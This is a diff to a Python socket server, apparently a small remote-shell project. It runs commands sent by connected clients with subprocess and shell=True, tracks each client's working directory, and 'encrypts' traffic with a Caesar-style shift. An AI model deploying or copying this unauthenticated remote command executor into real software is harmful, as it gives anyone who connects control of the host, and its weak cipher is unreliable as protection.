@@ -6,6 +6,7 @@ import random
 import subprocess
 from queue import Queue
 
+intial_dir = os.getcwd()
 my_secret_key = 14
 
 NUMBER_OF_THREADS = 2
@@ -15,6 +16,7 @@ queue = Queue()
 all_connections = []
 all_address = []
 all_session_keys = []
+all_working_dir = []
 
 def encrypt(s, key):
 	key = key % 26
@@ -124,6 +126,7 @@ def accepting_connections():
 			all_connections.append(conn)
 			all_address.append(address)
 			all_session_keys.append(session_key)
+			all_working_dir.append(intial_dir)
 
 			print("Connection has been established: " + address[0] + " Port " + str(address[1]))
 
@@ -134,21 +137,25 @@ def start_turtle():
 	while True:
 		for i, conn in enumerate(all_connections):
 			try:
-				print("Here")
 				conn.settimeout(1)
 				client_query = conn.recv(20480).decode("utf-8")
 				client_query = decrypt(client_query, all_session_keys[i])
 
 				print(client_query)
+
+				currentWD = all_working_dir[i]
+				os.chdir(currentWD)
 				if client_query == "quit":
 					conn.close()
 					del all_connections[i]
 					del all_address[i]
 					del all_session_keys[i]
+					del all_working_dir[i]
 					break
 
 				if client_query[:2] == "cd":
 					os.chdir(client_query[3:])
+					all_working_dir[i] = os.getcwd()
 
 				if len(client_query) > 0:
 					cmd = subprocess.Popen(client_query[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -159,7 +166,7 @@ def start_turtle():
 
 			#print(output_str)
 			except Exception as e:
-				print(e)
+				#print(e)
 				#del all_connections[i]
 				#del all_address[i]
 				continue
